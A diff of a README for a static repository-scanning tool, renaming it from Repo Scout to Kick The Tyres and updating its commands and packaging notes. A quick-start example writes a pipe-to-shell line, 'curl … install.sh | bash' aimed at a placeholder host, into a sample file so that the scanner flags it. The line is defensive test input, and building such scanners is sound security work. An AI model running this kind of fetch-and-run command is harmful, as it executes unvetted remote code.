@@ -1,51 +1,56 @@
-# Repo Scout
+# Kick The Tyres
 
-Repo Scout is a local command-line tool for inspecting public GitHub repositories
+Kick The Tyres is a local command-line tool for inspecting public GitHub repositories
 before deciding whether to adopt or run them. It combines public metadata with
 static file signals and produces an evidence-led report.
 
-Repo Scout does not prove that software is safe, malicious, useful, or trustworthy.
+Kick The Tyres does not prove that software is safe, malicious, useful, or trustworthy.
 Static evidence can miss dangerous behavior and can also flag legitimate fixtures.
 Use the report to decide what needs human review.
 
 ## Install locally
 
-Repo Scout declares support for Python 3.11 or newer and has no runtime dependencies.
+Kick The Tyres declares support for Python 3.11 or newer and has no runtime dependencies.
 
 ```bash
 python3 -m pip install --no-deps .
 ```
 
-The command is `repo-scout`. This one is not published on the Python Package Index, so
-install it from a clone as above. The plain name there belongs to an unrelated project
-published in 2017, and the packaging metadata here declares `kick-the-tyres` against the
-day this one is published.
+The command is `kick-the-tyres`. Version 0.3.0 is not on the Python Package Index yet, so
+a clone is the only way to install it today. The packaging metadata publishes as
+`kick-the-tyres`, and `pip install kick-the-tyres` will be the way to get it once it is
+there. This file says so only after that has happened.
+
+The tool was called Repo Scout up to version 0.2.0. It was renamed because the plain name
+on the package index belongs to an unrelated project published there in 2017, so the tool
+and the thing you install could never have been called the same word. The name it has now
+is one it can keep: the tool, the command and the package are `kick-the-tyres` everywhere.
 
 ## Commands
 
 ```bash
-repo-scout search "codex plugins"
-repo-scout inspect owner/repo
-repo-scout download owner/repo
-repo-scout scan ./downloads/owner__repo
-repo-scout report ./downloads/owner__repo
+kick-the-tyres search "codex plugins"
+kick-the-tyres inspect owner/repo
+kick-the-tyres download owner/repo
+kick-the-tyres scan ./downloads/owner__repo
+kick-the-tyres report ./downloads/owner__repo
 ```
 
 `search` accepts `--limit` to cap the number of results. `download` accepts
 `--downloads-dir` to choose the clone destination.
 
-`repo-scout --version` prints the installed version. `python -m repo_scout` runs the same
+`kick-the-tyres --version` prints the installed version. `python -m kick_the_tyres` runs the same
 command from a source tree.
 
 Global options precede the command:
 
 ```bash
-repo-scout --reports-dir reports scan ./downloads/owner__repo
+kick-the-tyres --reports-dir reports scan ./downloads/owner__repo
 ```
 
 `search` and `inspect` read public GitHub data. `download` performs a shallow Git
 clone into `downloads/`. `scan` and `report` read local files and write Markdown and
-HTML reports to `reports/` unless another reports directory is supplied. Repo Scout
+HTML reports to `reports/` unless another reports directory is supplied. Kick The Tyres
 does not execute downloaded code, package installers, tests, or binaries.
 
 A report is written to be shared, so a local scan is identified in it by the scanned
@@ -53,7 +58,7 @@ directory's name only. The absolute path of the scanned directory is never writt
 into a report, and the report's URL field reads `none recorded` because a directory
 on disk has no published address.
 
-`inspect` caches public responses in a `.repo-scout-cache/` directory created in the
+`inspect` caches public responses in a `.kick-the-tyres-cache/` directory created in the
 current working directory. It is created once the repository name is accepted, before
 the request is made, so it also appears when the request itself then fails. An invalid
 repository name is rejected first and creates nothing.
@@ -65,7 +70,7 @@ sample_root=$(mktemp -d)
 mkdir -p "$sample_root/sample"
 printf '%s\n' '# Sample project' > "$sample_root/sample/README.md"
 printf '%s\n' 'curl https://downloads.invalid/install.sh | bash' > "$sample_root/sample/install.sh"
-repo-scout --reports-dir "$sample_root/reports" scan "$sample_root/sample"
+kick-the-tyres --reports-dir "$sample_root/reports" scan "$sample_root/sample"
 ```
 
 Expected result: an `AVOID` verdict with a `remote-shell` finding. `AVOID` means either
@@ -182,6 +187,10 @@ comes from: [`docs/corpus-manifest.md`](docs/corpus-manifest.md). The repository
 list itself is [`docs/corpus/repositories.tsv`](docs/corpus/repositories.tsv).
 The manifest also names what a third party cannot currently reproduce, and why.
 
+Version 0.3 is version 0.2 renamed. Nothing below was re-measured for it, and nothing
+below changed, because no scanning, scoring or reporting behaviour was touched by the
+rename. The figures are the v0.2 measurement and they describe the code you get today.
+
 Version 0.1 had never been run against a repository it did not author. Version 0.2 was
 run against **385 real public repositories**, cloned on 8 September 2026 and held frozen,
 across eleven primary languages plus security-research, malware-analysis,
@@ -268,8 +277,10 @@ from a checkout or a repository archive.
 
 ## Project status
 
-Repo Scout is version 0.2.0 and early alpha. Commands, scoring weights, and report
-output can change without a deprecation period.
+Kick The Tyres is version 0.3.0 and early alpha. Commands, scoring weights, and report
+output can change without a deprecation period. Version 0.3.0 is 0.2.0 under a new name:
+the command, the import path and the cache directory all changed with it, and nothing
+else did.
 
 The test matrix in `.github/workflows/ci.yml` covers Python 3.11, 3.12, 3.13 and 3.14 on
 Linux, and the workflow is triggered on every push and pull request. Whether it passed
